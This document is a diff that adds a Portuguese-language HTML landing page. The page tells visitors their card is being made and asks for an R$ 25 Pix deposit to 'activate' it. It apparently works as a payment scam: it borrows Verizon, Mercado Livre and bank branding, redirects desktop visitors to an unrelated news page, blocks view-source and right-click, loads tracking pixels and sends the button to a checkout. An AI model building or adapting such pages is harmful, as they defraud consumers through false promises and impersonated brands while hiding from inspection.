@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+
+    <meta charset="UTF-8">
+    <script type="text/javascript" async="" src="js/events_1.js"></script>
+    <script type="text/javascript" async="" src="js/events.js"></script>
+    <script type="text/javascript" async="" src="js/events_2.js"></script>
+    <script async="" src="js/fbevents.js"></script>
+    <script type="text/javascript" async="" src="js/events_3.js"></script>
+    <script type="text/javascript" async="" src="js/events_1_2.js"></script>
+    <script type="text/javascript" async="" src="js/events_1_2.js"></script>
+    <script type="text/javascript" async="" src="js/events_1_1.js"></script>
+    <script type="text/javascript" async="" src="js/events_2_1.js"></script>
+    <script type="text/javascript" async="" src="js/events_2_1.js"></script>
+    <script type="text/javascript" async="" src="js/events_3_1.js"></script>
+    <script type="text/javascript" async="" src="js/events_4.js"></script>
+    <script async="" src="js/fbevents.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+
+    <link href="css/bootstrap.min-24.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+            background: WHITE;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: black;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #f5d103;
+            font-weight: 500;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #f5d103 !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #ffd900;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+            /* Esconde o elemento por padrão */
+        }
+
+        #conclusao h4 {
+            color: green;
+            /* Define a cor do texto */
+            font-weight: bold;
+            /* Define o texto em negrito */
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+    </style>
+
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else { //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else { //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+    <script async="" defer="" src="js/pixel_1.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
+    <script type="text/javascript">
+        // Verifica o dispositivo e redireciona antes de carregar outros recursos
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+        }
+    </script>
+   <script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="header">
+            <img decoding="async" style="width: 180px;" src="images/VERIZON.png" alt="Imagem Centralizada"
+                data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png"
+                data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;"
+                    src="lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000-9.png"
+                    alt="Imagem Centralizada"></noscript>
+        </div>
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div style="margin-top: 18px;" class="main-content text-center">
+                <strong></strong>
+                <h3 style="color: #f5d103;">Parabéns, o seu cartão está em produção! Hora de ativar sua conta</h3>
+                <p>Para ativar sua conta e usar seu cartão virtual, é necessário um depósito mínimo de <strong
+                        class="">R$ 25</strong>.</p>
+                <p style="color: #28c45c;">Este valor ficará disponível na carteira da sua conta e você poderá usá-lo como
+                    quiser assim que tiver acesso ao aplicativo. <b>Sem esse depósito, não conseguiremos enviar o
+                        cartão!<b> </b></b></p><b><b><img decoding="async" src="images/Verisonapp.png"
+                            alt="Separar Dinheiro" class="imagem-personalizada">
+                        <style>
+                            /* Estilo para a imagem */
+                            .imagem-personalizada {
+                                display: block;
+                                /* A imagem se torna um bloco */
+                                margin: 0 auto;
+                                /* Centraliza a imagem horizontalmente */
+                                width: 00px;
+                                /* Ajusta a largura da imagem (pode ser alterado conforme necessário) */
+                                height: auto;
+                                /* Mantém a proporção original da imagem */
+                            }
+                        </style>
+
+
+                        <div style="background-color: #f5f7f9;" class="card p-3 my-4">
+                            <strong></strong>
+                            <h4 class="text-pink" style="font-weight: bold;color: #ff2424;">Conta Digital:</h4>
+                            <ul class="text-start custom-list" style="list-style: none;">
+                                <li>
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                        class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256"
+                                        style="vertical-align: middle; margin-right: 8px;">
+                                        <path fill="#28c45c"
+                                            d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                        </path>
+                                    </svg>
+                                    Pix 24 horas
+                                </li>
+                                <li>
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                        class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256"
+                                        style="vertical-align: middle; margin-right: 8px;">
+                                        <path fill="#28c45c"
+                                            d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                        </path>
+                                    </svg>
+                                    Pagamento de boletos
+                                </li>
+                                <li>
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                        class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256"
+                                        style="vertical-align: middle; margin-right: 8px;">
+                                        <path fill="#28c45c"
+                                            d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                        </path>
+                                    </svg>
+                                    Cartão Virtual
+                                </li>
+                                <li>
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                        class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256"
+                                        style="vertical-align: middle; margin-right: 8px;">
+                                        <path fill="#28c45c"
+                                            d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                        </path>
+                                    </svg>
+                                    Saques em caixas eletrônicos
+                                </li>
+                                <li>
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img"
+                                        class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256"
+                                        style="vertical-align: middle; margin-right: 8px;">
+                                        <path fill="#28c45c"
+                                            d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32">
+                                        </path>
+                                    </svg>
+                                    Atendimento ao cliente 24/7
+                                </li>
+                            </ul>
+
+                            <p class="text-pink">Ative sua conta depositando nela:</p>
+                            <div class="text-center">
+                                <img decoding="async" src="images/maozinha.png" alt="Pix Logo" width="100" class="my-3"
+                                    data-lazy-src="https://www.willbank.com.br/images/conta-nova/celular-na-mao.png"><noscript><img
+                                        decoding="async" src="https://unisolucoes.online/outra//pix-106.svg"
+                                        alt="Pix Logo" width="100" class="my-3"></noscript>
+                            </div>
+                            <strong></strong>
+                            <h3 class="text-pink"><strong>R$ 25</strong></h3>
+                        </div>
+
+                        <button type="button" id="ativarConta" class="btn-custom rounded-pill w-100 mt-3"
+                            style="background-color: #f5d103; color: #000000;">
+                            Ativar minha conta agora
+                        </button>
+
+                        <script>
+                            function redirecionar() {
+                                const params = new URLSearchParams(window.location.search).toString();
+                                const checkoutUrl = './checkout/' + (params ? '?' + params : '');
+                                console.log('Redirecionando para:', checkoutUrl);
+                                window.location.href = checkoutUrl;
+                            }
+
+                            document.getElementById('ativarConta').addEventListener('click', function(e) {
+                                e.preventDefault();
+                                e.stopPropagation();
+                                redirecionar();
+                            });
+                        </script>
+
+                    </b></b>
+            </div><b><b>
+                </b></b>
+        </div><b><b>
+                <div class="footer py-4" id="footerChg">
+                    © 2025 Mercado Livre. CNPJ 68.694.585/0001-20.
+                    Av. Brig. Faria Lima, 1811, São Paulo/SP
+                </div>
+            </b></b>
+    </div><b><b>
+
+        </b></b>
+</body>
+
+</html>
